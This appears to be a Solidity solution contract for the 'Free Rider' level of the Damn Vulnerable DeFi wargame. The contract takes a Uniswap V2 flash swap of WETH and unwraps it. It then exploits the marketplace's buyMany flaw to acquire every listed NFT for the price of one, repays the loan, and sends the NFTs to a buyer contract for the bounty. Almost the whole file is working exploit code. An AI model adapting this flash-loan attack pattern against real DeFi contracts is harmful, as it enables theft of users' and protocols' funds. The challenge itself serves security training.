import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderBuyer.sol";
import "../DamnValuableNFT.sol";

import "hardhat/console.sol";

interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
    function approve(address spender, uint value) external returns (bool);
    function balanceOf(address owner) external view returns (uint);
}



interface IPuppetV2Pool {

    function borrow(uint256) external;

    function calculateDepositOfWETHRequired(uint256 ) external view returns (uint256) ;

}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}


interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);
    function symbol() external pure returns (string memory);
    function decimals() external pure returns (uint8);
    function totalSupply() external view returns (uint);
    function balanceOf(address owner) external view returns (uint);
    function allowance(address owner, address spender) external view returns (uint);

    function approve(address spender, uint value) external returns (bool);
    function transfer(address to, uint value) external returns (bool);
    function transferFrom(address from, address to, uint value) external returns (bool);

    function DOMAIN_SEPARATOR() external view returns (bytes32);
    function PERMIT_TYPEHASH() external pure returns (bytes32);
    function nonces(address owner) external view returns (uint);

    function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external;

    event Mint(address indexed sender, uint amount0, uint amount1);
    event Burn(address indexed sender, uint amount0, uint amount1, address indexed to);
    event Swap(
        address indexed sender,
        uint amount0In,
        uint amount1In,
        uint amount0Out,
        uint amount1Out,
        address indexed to
    );
    event Sync(uint112 reserve0, uint112 reserve1);

    function MINIMUM_LIQUIDITY() external pure returns (uint);
    function factory() external view returns (address);
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function price0CumulativeLast() external view returns (uint);
    function price1CumulativeLast() external view returns (uint);
    function kLast() external view returns (uint);

    function mint(address to) external returns (uint liquidity);
    function burn(address to) external returns (uint amount0, uint amount1);
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function skim(address to) external;
    function sync() external;

    function initialize(address, address) external;
}



contract FreeRiderBuyerExp is IUniswapV2Callee,IERC721Receiver{

    IUniswapV2Pair pair;
    FreeRiderNFTMarketplace market;
    FreeRiderBuyer buyer;
    IWETH weth;
    DamnValuableNFT nft;

    struct Params{
        uint repayAmount;
        uint[] tokenIds;
        uint buyValue;
    }

    constructor(address payable _pair,address payable _market,address _buyer,address _nft, address _weth) payable {
        pair = IUniswapV2Pair(_pair);
        market = FreeRiderNFTMarketplace(_market);
        buyer = FreeRiderBuyer(_buyer);
        nft = DamnValuableNFT(_nft);
        weth = IWETH(_weth);
    }

    function initFlashloan(uint amount, Params calldata params) external {
        // floshloan weth
        pair.swap(amount, 0, address(this), abi.encode(params));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override{
        Params memory params = abi.decode(data,(Params));
        weth.withdraw(weth.balanceOf(address(this)));
        market.buyMany{value:params.buyValue}(params.tokenIds);
        weth.deposit{value:params.repayAmount}();
        weth.transfer(address(pair), params.repayAmount);
        for (uint i=0 ; i < params.tokenIds.length; i++)
            nft.safeTransferFrom(address(this), address(buyer), params.tokenIds[i]);
    }

    function withdraw() external {
        payable(msg.sender).transfer(address(this).balance);
    }

    fallback() external payable {
    }

    function onERC721Received(
        address,
        address,
        uint256 _tokenId,
        bytes memory
    ) 
        external
        override
        returns (bytes4) 
    {
        return IERC721Receiver.onERC721Received.selector;
    }
}

// flashloan all weth from lending pool